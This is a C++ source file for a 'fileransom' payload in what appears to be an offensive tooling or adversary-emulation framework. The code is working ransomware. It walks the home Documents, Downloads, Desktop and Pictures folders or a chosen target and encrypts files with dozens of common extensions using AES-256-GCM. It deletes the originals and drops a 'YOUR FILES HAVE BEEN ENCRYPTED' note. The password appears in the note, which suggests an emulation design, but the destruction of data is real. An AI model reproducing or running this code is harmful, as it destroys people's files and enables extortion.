#include <sys/stat.h>
#include <dirent.h>

#include <algorithm>
#include <cctype>
#include <functional>
#include <optional>
#include <string>
#include <vector>

#include <openssl/evp.h>

#include "snake/crypto.hpp"
#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

std::string path_join(const std::string& a, const std::string& b) {
    if (a.empty()) return b;
    std::string r = a;
    while (r.size() > 1 && r.back() == '/') r.pop_back();
    return r + "/" + b;
}

std::string user_home_dir() {
    const char* h = ::getenv("HOME");
    return h == nullptr ? std::string() : std::string(h);
}

void walk(const std::string& root, const std::function<void(const std::string&, bool)>& fn) {
    struct stat st;
    if (::lstat(root.c_str(), &st) != 0) return;
    bool is_dir = S_ISDIR(st.st_mode);
    fn(root, is_dir);
    if (!is_dir) return;

    DIR* d = ::opendir(root.c_str());
    if (d == nullptr) return;
    std::vector<std::string> names;
    while (struct dirent* e = ::readdir(d)) {
        std::string n = e->d_name;
        if (n == "." || n == "..") continue;
        names.push_back(n);
    }
    ::closedir(d);
    std::sort(names.begin(), names.end());
    for (const auto& n : names) walk(root + "/" + n, fn);
}

std::string ext_lower(const std::string& path) {
    for (long i = (long)path.size() - 1; i >= 0; --i) {
        char c = path[(size_t)i];
        if (c == '/') break;
        if (c == '.') {
            std::string e = path.substr((size_t)i);
            for (char& ch : e) ch = (char)::tolower((unsigned char)ch);
            return e;
        }
    }
    return "";
}

bool has_prefix(const std::string& s, const std::string& p) { return s.compare(0, p.size(), p) == 0; }

bool has_suffix(const std::string& s, const std::string& x) {
    return s.size() >= x.size() && s.compare(s.size() - x.size(), x.size(), x) == 0;
}

std::optional<Bytes> pbkdf2_sha256(const std::string& password, const Bytes& salt, int len) {
    Bytes key((size_t)len);
    if (PKCS5_PBKDF2_HMAC(password.data(), (int)password.size(), salt.data(), (int)salt.size(),
                          100000, EVP_sha256(), len, key.data()) != 1) {
        return std::nullopt;
    }
    return key;
}

std::optional<Bytes> aes256gcm_seal(const Bytes& key, const Bytes& nonce, const Bytes& plaintext) {
    if (key.size() != 32 || nonce.size() != 12) return std::nullopt;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (ctx == nullptr) return std::nullopt;
    Bytes out(plaintext.size() + 16);
    int outl = 0;
    int total = 0;
    bool ok = EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) == 1 &&
              EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, (int)nonce.size(), nullptr) == 1 &&
              EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce.data()) == 1 &&
              EVP_EncryptUpdate(ctx, out.data(), &outl, plaintext.data(), (int)plaintext.size()) == 1;
    if (ok) {
        total = outl;
        ok = EVP_EncryptFinal_ex(ctx, out.data() + total, &outl) == 1;
        total += outl;
        uint8_t tag[16];
        ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) == 1;
        if (ok) {
            std::copy(tag, tag + 16, out.begin() + total);
            total += 16;
        }
    }
    EVP_CIPHER_CTX_free(ctx);
    if (!ok) return std::nullopt;
    out.resize((size_t)total);
    return out;
}

struct EncFile {
    std::string original;
    std::string encrypted;
    long long size = 0;
};

struct RansomResult {
    std::string timestamp;
    std::string password;
    std::string mode;
    long long encrypted_files = 0;
    long long total_files = 0;
    std::vector<std::string> target_dirs;
    std::vector<EncFile> files;
    std::string ransom_note;
};

const char* const kRansomExtensions[] = {
    ".txt",  ".doc",  ".docx", ".pdf",  ".xls",  ".xlsx", ".ppt",  ".pptx", ".jpg",  ".jpeg",
    ".png",  ".gif",  ".bmp",  ".zip",  ".tar",  ".gz",   ".7z",   ".rar",  ".sql",  ".db",
    ".sqlite", ".csv", ".xml", ".json", ".yml",  ".yaml", ".py",   ".js",   ".html", ".css",
    ".php",  ".java", ".cpp",  ".c",    ".go",   ".mp3",  ".mp4",  ".avi",  ".mkv",  ".odt",
    ".ods",  ".odp",  ".rtf",  ".tex",  ".md",   ".key",  ".pem",  ".crt",  ".p12"};

const char* const kSystemCritical[] = {"/etc", "/boot", "/proc", "/sys",  "/dev",
                                       "/run", "/lib",  "/bin",  "/sbin", "/usr"};

std::optional<EncFile> encrypt_single_file(const std::string& path, const Bytes& key) {
    std::string data;
    if (!read_file(path, data)) return std::nullopt;

    Bytes nonce = snake::random_bytes(12);
    Bytes plaintext(data.begin(), data.end());
    std::optional<Bytes> ct = aes256gcm_seal(key, nonce, plaintext);
    if (!ct) return std::nullopt;

    std::string encrypted_path = path + ".encrypted";

    Bytes salt = snake::random_bytes(16);
    Bytes output;
    output.reserve(nonce.size() + salt.size() + ct->size());
    output.insert(output.end(), nonce.begin(), nonce.end());
    output.insert(output.end(), salt.begin(), salt.end());
    output.insert(output.end(), ct->begin(), ct->end());

    if (!mut_write(encrypted_path, std::string(output.begin(), output.end()), 0600)) {
        return std::nullopt;
    }
    mut_remove(path);

    EncFile ef;
    ef.original = path;
    ef.encrypted = encrypted_path;
    ef.size = (long long)output.size();
    return ef;
}

std::pair<int, int> encrypt_directory(const std::string& dir, const Bytes& key, RansomResult& r) {
    for (const char* crit : kSystemCritical) {
        if (has_prefix(dir, crit)) return {0, 0};
    }

    int encrypted = 0;
    int total = 0;
    walk(dir, [&](const std::string& path, bool is_dir) {
        if (is_dir) return;
        std::string ext = ext_lower(path);
        bool matched = false;
        for (const char* e : kRansomExtensions) {
            if (ext == e) {
                matched = true;
                break;
            }
        }
        if (!matched) return;
        if (has_suffix(path, ".encrypted")) return;

        total++;
        if (std::optional<EncFile> ef = encrypt_single_file(path, key)) {
            r.files.push_back(*ef);
            encrypted++;
        }
    });
    return {encrypted, total};
}

class FileRansom : public Payload {
  public:
    const char* name() const override { return "fileransom"; }
    const char* category() const override { return "impact"; }
    const char* description() const override {
        return "AES-256-GCM file encryption with ransom note";
    }

    Output execute(const Args& args) const override {
        std::string target = arg(args, "target");
        std::string mode = arg(args, "mode");
        std::string password = arg(args, "password");
        RansomResult r = encrypt(target, mode, password);

        OJ files = OJ::array();
        for (const auto& f : r.files) {
            OJ o = OJ::object();
            o["original"] = f.original;
            o["encrypted"] = f.encrypted;
            o["size"] = f.size;
            files.push_back(o);
        }

        OJ out = OJ::object();
        out["timestamp"] = r.timestamp;
        out["password"] = r.password;
        out["mode"] = r.mode;
        out["encrypted_files"] = r.encrypted_files;
        out["total_files"] = r.total_files;
        out["target_directories"] = r.target_dirs;
        out["files"] = r.files.empty() ? OJ(nullptr) : files;
        if (!r.ransom_note.empty()) out["ransom_note"] = r.ransom_note;

        std::string s = MarshalJSON(out);
        return Output(s.begin(), s.end());
    }

  private:
    static std::string arg(const Args& args, const std::string& k) {
        auto it = args.find(k);
        return it == args.end() ? std::string() : it->second;
    }

    static RansomResult encrypt(const std::string& target, const std::string& mode,
                                const std::string& password_in) {
        std::string password = password_in;
        if (password.empty()) {
            Bytes b = snake::random_bytes(16);
            password = snake::to_hex(b);
        }

        Bytes salt = snake::random_bytes(16);
        Bytes key = pbkdf2_sha256(password, salt, 32).value_or(Bytes(32, 0));

        RansomResult r;
        r.timestamp = now_rfc3339();
        r.password = password;
        r.mode = mode;

        std::string home = user_home_dir();
        if (mode == "system_test") {
            r.target_dirs = {"/tmp"};
        } else if (mode == "system_user" || has_prefix(mode, "system_")) {
            r.target_dirs = {path_join(home, "Documents"), path_join(home, "Downloads"),
                             path_join(home, "Desktop"), path_join(home, "Pictures")};
        } else if (target == "all" || target.empty()) {
            r.target_dirs = {path_join(home, "Documents"), path_join(home, "Downloads"),
                             path_join(home, "Desktop"), path_join(home, "Pictures")};
        } else {
            r.target_dirs = {target};
        }

        for (const auto& dir : r.target_dirs) {
            auto res = encrypt_directory(dir, key, r);
            r.encrypted_files += res.first;
            r.total_files += res.second;
        }

        std::string note =
            "=============================================\n"
            " YOUR FILES HAVE BEEN ENCRYPTED\n"
            "=============================================\n"
            "\n"
            "Your important files have been encrypted with AES-256 encryption.\n"
            "\n"
            "To decrypt, you need the password.\n"
            "\n"
            "Password: " +
            password +
            "\n"
            "\n"
            "=============================================\n"
            " INSTRUCTIONS\n"
            "=============================================\n"
            "1. Save this password securely\n"
            "2. Run decryption with this password\n"
            "3. All .encrypted files will be restored\n"
            "\n"
            "=============================================\n"
            "Generated: " +
            local_rfc3339() +
            "\nTotal Files Encrypted: " + std::to_string(r.encrypted_files) +
            "\n=============================================";

        std::string note_path = path_join(home, "README_FOR_DECRYPT.txt");
        mut_write(note_path, note, 0644);
        r.ransom_note = note_path;

        return r;
    }
};

FileRansom g_fileransom;

struct Reg {
    Reg() { Register(&g_fileransom); }
};
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
